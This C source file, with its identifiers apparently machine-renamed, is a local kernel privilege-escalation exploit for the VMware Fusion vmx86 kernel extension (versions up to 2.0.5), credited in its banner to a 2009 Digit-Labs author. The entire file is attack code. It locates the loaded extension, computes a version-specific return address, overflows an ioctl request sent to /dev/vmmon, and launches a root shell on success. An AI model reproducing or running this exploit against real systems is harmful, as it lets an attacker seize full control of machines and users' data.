
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct ioctl_req {int * pad; } ;
typedef int mach_port_t ;
struct TYPE_3__ {char* version; int address; scalar_t__ size; int * name; scalar_t__ next; } ;
typedef TYPE_1__ kmod_info_t ;
typedef scalar_t__ kern_return_t ;
struct TYPE_4__ {int shell_addr; int * name; } ;


 int VAR_0 ;
 int VAR_1 ;
 scalar_t__ VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int) ;
 int FUNC_1 (char*,char**,int *) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int ,char*,char*,...) ;
 int FUNC_5 () ;
 int FUNC_6 (int,int ,struct ioctl_req*) ;
 scalar_t__ FUNC_7 (int ,void*,unsigned int*) ;
 char* FUNC_8 (scalar_t__) ;
 int FUNC_9 () ;
 int FUNC_10 (int **,int ,int) ;
 int FUNC_11 (struct ioctl_req*,int,int) ;
 int FUNC_12 (char*,int ) ;
 int FUNC_13 (char*,...) ;
 int FUNC_14 (int) ;
 int VAR_5 ;
 int VAR_6 ;
 scalar_t__ FUNC_15 (int *,char*) ;
 char* FUNC_16 (int *,char) ;
 TYPE_2__* VAR_7 ;
 int VAR_8 ;

int
FUNC_17 (int VAR_9, char **VAR_10)
{
  kmod_info_t *VAR_11, *VAR_12;
  mach_port_t VAR_13;
  kern_return_t VAR_14;
  struct ioctl_req VAR_15;
  unsigned int VAR_16;
  int VAR_17;
  int VAR_18, VAR_19, VAR_20, VAR_21;

  FUNC_13 ("VMware Fusion <= 2.0.5 vmx86 kext local kernel root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  VAR_13 = FUNC_9 ();
  VAR_14 = FUNC_7 (VAR_13, (void *) &VAR_11, &VAR_16);
  if (VAR_14 != VAR_2)
    {
      FUNC_4 (VAR_5, "* couldn't get list of loaded kexts from kernel - %s\n",
               FUNC_8 (VAR_14));
      FUNC_2 (VAR_0);
    }

  for (VAR_12 = VAR_11; VAR_12; VAR_12 = (VAR_12->next) ? (VAR_12 + 1) : ((void*)0))
    if (FUNC_15 (VAR_12->name, "com.vmware.kext.vmx86") == 0)
      break;

  if (VAR_12 == ((void*)0))
    {
      FUNC_4 (VAR_5, "%s: vmx86 kext not loaded?\n", VAR_10[0]);
      FUNC_2 (VAR_0);
    }

  for (VAR_20 = 0; VAR_7[VAR_20].name; VAR_20++)
    if (FUNC_15 (VAR_7[VAR_20].name, VAR_12->version) == 0)
      {
        VAR_17 = VAR_7[VAR_20].shell_addr;
        break;
      }

  if (VAR_7[VAR_20].name == ((void*)0))
    {
      FUNC_4 (VAR_5, "%s: unsupported vmx86 version found :( [%s]\n",
               VAR_10[0], VAR_12->version);
      FUNC_2 (VAR_0);
    }

  FUNC_13 ("* kmod: %s, version: %s, addr: 0x%08X -> 0x%08X\n",
          FUNC_16 (VAR_12->name, '.') + 1, VAR_12->version, (int) VAR_12->address, (int) (VAR_12->address + VAR_12->size));
  FUNC_13 ("* ret addr: 0x%08X + 0x%08X = @0x%08X\n",
          (int) VAR_12->address, VAR_17 + 0x1000, (int) VAR_12->address + VAR_17 + 0x1000);

  VAR_18 = FUNC_12 ("/dev/vmmon", VAR_3);
  if (VAR_18 < 0)
    {
      FUNC_4 (VAR_5, "%s: open failed\n", VAR_10[0]);
      FUNC_2 (VAR_0);
    }

  FUNC_11 (&VAR_15, 0xCC, sizeof VAR_15);
  FUNC_10 (&VAR_15.pad, VAR_8, sizeof VAR_8 - 1);
  *(unsigned int *) &VAR_15.pad[0x21] = VAR_12->address + VAR_17 + 0x1000;

  FUNC_13 ("* hitting...");
  FUNC_3 (VAR_6);
  FUNC_14 (2);

  VAR_21 = FUNC_6 (VAR_18, VAR_4, &VAR_15);
  FUNC_13 ("done\n\n");
  FUNC_0 (VAR_18);

  VAR_19 = FUNC_5 ();
  FUNC_13 ("* getuid(): %d\n", VAR_19);
  if (VAR_19 == 0)
    {
      char *VAR_22[] = { "/bin/bash", ((void*)0) };
      FUNC_13 ("+Wh00t\n\n");

      FUNC_1 (VAR_22[0], VAR_22, ((void*)0));
    }
  else
    FUNC_4 (VAR_5, "%s: failed to obtain root :(\n", VAR_10[0]);

  return (VAR_1);
}
